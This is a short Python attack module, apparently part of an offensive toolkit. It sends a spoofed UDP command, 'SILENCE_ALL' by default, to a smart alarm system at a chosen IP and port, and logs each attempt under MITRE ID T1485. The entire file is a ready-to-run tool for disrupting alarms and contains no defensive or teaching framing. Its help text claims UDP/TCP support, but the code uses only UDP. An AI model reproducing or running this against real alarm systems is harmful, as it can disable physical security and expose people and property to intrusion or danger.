#!/usr/bin/env python3
# modules/attacks/iot_alarm_disruptor.py

import socket
import argparse
import time
import json
import os
from datetime import datetime

LOG_FILE = "results/alarm_disrupt_log.json"
MITRE_TTP = "T1485"

def log_attack(target_ip, command):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "target_ip": target_ip,
        "command_sent": command,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def disrupt_alarm(ip, port, command):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(command.encode(), (ip, port))
        log_attack(ip, command)
        print(f"[✓] Sent command to alarm system at {ip}:{port}")
    except Exception as e:
        print(f"[!] Failed to disrupt: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Disrupt or loop smart alarm systems")
    parser.add_argument("--ip", required=True, help="Target alarm system IP")
    parser.add_argument("--port", type=int, default=9000, help="Target port (UDP/TCP)")
    parser.add_argument("--command", default="SILENCE_ALL", help="Spoofed command to send")
    args = parser.parse_args()
    disrupt_alarm(args.ip, args.port, args.command)
